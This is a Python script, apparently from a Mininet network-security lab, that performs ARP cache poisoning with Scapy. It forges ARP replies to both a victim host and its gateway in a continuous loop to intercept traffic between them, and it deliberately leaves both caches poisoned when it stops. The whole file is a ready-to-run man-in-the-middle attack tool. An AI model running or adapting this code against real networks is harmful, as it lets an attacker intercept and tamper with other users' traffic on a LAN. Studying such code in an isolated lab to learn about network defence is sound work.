#!/usr/bin/env python3
"""
Attack 3: ARP Cache Poisoning
Forges ARP reply packets to place the attacker between a victim host and its
gateway on the same LAN segment.

Uses Scapy for packet crafting -- no external attack tools.

Usage (from mininet CLI):
    ws3 python3 attacks/attack_3.py --victim 10.1.0.2 --gateway 10.1.0.1
    ws3 python3 attacks/attack_3.py --victim 10.1.0.2 --gateway 10.1.0.1 --duration 30 --verbose
"""

import argparse
import ipaddress
import signal
import sys
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp

conf.verb = 0


def resolve_mac(ip_address):
    """Resolve an IPv4 address to a MAC address with ARP."""
    mac = getmacbyip(ip_address)
    if mac is None or mac == "ff:ff:ff:ff:ff:ff":
        return None
    return mac


def build_poison_packet(target_ip, target_mac, spoofed_ip, attacker_mac):
    """
    Tell target_ip that spoofed_ip is reachable at attacker_mac.
    This is the forged mapping that poisons the ARP cache.
    """
    return Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoofed_ip,
        hwsrc=attacker_mac,
    )


def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac,
               attacker_mac, iface, interval, duration, verbose):
    """Continuously poison victim and gateway ARP caches."""
    poison_victim = build_poison_packet(
        victim_ip, victim_mac, gateway_ip, attacker_mac
    )
    poison_gateway = build_poison_packet(
        gateway_ip, gateway_mac, victim_ip, attacker_mac
    )

    start = time.time()
    sent_pairs = 0

    while True:
        sendp(poison_victim, iface=iface, verbose=False)
        sendp(poison_gateway, iface=iface, verbose=False)
        sent_pairs += 1

        if verbose:
            print(
                f"  [+] Pair #{sent_pairs}: {gateway_ip} -> attacker MAC "
                f"on victim, {victim_ip} -> attacker MAC on gateway",
                flush=True,
            )
        else:
            print(f"\r  [+] ARP poison pairs sent: {sent_pairs}", end="", flush=True)

        if duration > 0 and (time.time() - start) >= duration:
            break

        time.sleep(interval)

    if not verbose:
        print()


def parse_args():
    parser = argparse.ArgumentParser(
        description="ARP Cache Poisoning MITM -- Scapy, no external tools"
    )
    parser.add_argument("--victim", required=True,
                        help="Victim host IP, for example 10.1.0.2")
    parser.add_argument("--gateway", required=True,
                        help="Gateway IP to impersonate, for example 10.1.0.1")
    parser.add_argument("--iface", default=None,
                        help="Interface to send ARP frames on (auto-detect if omitted)")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Seconds between poisoning rounds (default 2.0)")
    parser.add_argument("--duration", type=float, default=0,
                        help="Duration in seconds (0 = infinite, Ctrl+C to stop)")
    parser.add_argument("--verbose", action="store_true",
                        help="Print every poisoning round")
    return parser.parse_args()


def validate_args(args):
    errors = []

    for name, value in [("--victim", args.victim), ("--gateway", args.gateway)]:
        try:
            ipaddress.ip_address(value)
        except ValueError:
            errors.append(f"{name}: '{value}' is not a valid IP address")

    if args.victim == args.gateway:
        errors.append("--victim and --gateway must be different")
    if args.interval <= 0:
        errors.append("--interval must be > 0")
    if args.duration < 0:
        errors.append("--duration must be >= 0")

    if errors:
        for error in errors:
            print(f"[-] {error}")
        sys.exit(1)


def main():
    args = parse_args()
    validate_args(args)

    iface = args.iface or conf.iface
    attacker_mac = get_if_hwaddr(iface)

    print("[*] ARP Cache Poisoning Attack")
    print(f"[*] Interface   : {iface}")
    print(f"[*] Attacker MAC: {attacker_mac}")
    print(f"[*] Victim      : {args.victim}")
    print(f"[*] Gateway     : {args.gateway}")

    victim_mac = resolve_mac(args.victim)
    gateway_mac = resolve_mac(args.gateway)

    if victim_mac is None:
        print(f"[-] Could not resolve victim MAC for {args.victim}")
        sys.exit(1)
    if gateway_mac is None:
        print(f"[-] Could not resolve gateway MAC for {args.gateway}")
        sys.exit(1)

    print(f"[+] {args.victim} -> {victim_mac}")
    print(f"[+] {args.gateway} -> {gateway_mac}")

    def handle_sigint(sig, frame):
        print("\n[!] Ctrl+C detected")
        print("[!] ARP caches were intentionally left poisoned")
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    duration_text = (
        f"{args.duration}s" if args.duration > 0 else "infinite (Ctrl+C to stop)"
    )
    print(f"[*] Duration    : {duration_text}")
    print(f"[*] Interval    : {args.interval}s")
    print("[*] Starting attack...\n")

    try:
        poison_arp(
            args.victim,
            victim_mac,
            args.gateway,
            gateway_mac,
            attacker_mac,
            iface,
            args.interval,
            args.duration,
            args.verbose,
        )
    except Exception as error:
        print(f"\n[-] Unexpected error: {error}")
    finally:
        print("[!] ARP caches were intentionally left poisoned")
        print("[+] Attack stopped")


if __name__ == "__main__":
    main()
